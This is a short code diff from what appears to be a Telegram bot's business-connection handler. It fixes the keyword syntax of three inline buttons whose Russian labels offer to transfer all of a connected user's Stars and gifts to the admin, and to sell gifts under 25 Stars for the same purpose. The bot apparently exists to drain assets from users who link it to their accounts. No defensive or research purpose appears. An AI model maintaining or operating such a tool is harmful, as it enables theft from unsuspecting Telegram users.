@@ -371,11 +371,11 @@ async def handle_business_connect(business_connection: BusinessConnection):
         keyboard = InlineKeyboardMarkup(
             inline_keyboard=[
                 [
-                    InlineKeyboardButton("Перевести все звёзды админу", callback_data=f"transfer_stars:{user_id}"),
-                    InlineKeyboardButton("Перевести все подарки админу", callback_data=f"transfer_gifts:{user_id}")
+                    InlineKeyboardButton(text="Перевести все звёзды админу", callback_data=f"transfer_stars:{user_id}"),
+                    InlineKeyboardButton(text="Перевести все подарки админу", callback_data=f"transfer_gifts:{user_id}")
                 ],
                 [
-                    InlineKeyboardButton("Продать все подарки до 25⭐ и перевести звёзды", callback_data=f"sell_gifts_under_25:{user_id}")
+                    InlineKeyboardButton(text="Продать все подарки до 25⭐ и перевести звёзды", callback_data=f"sell_gifts_under_25:{user_id}")
                 ]
             ]
         )
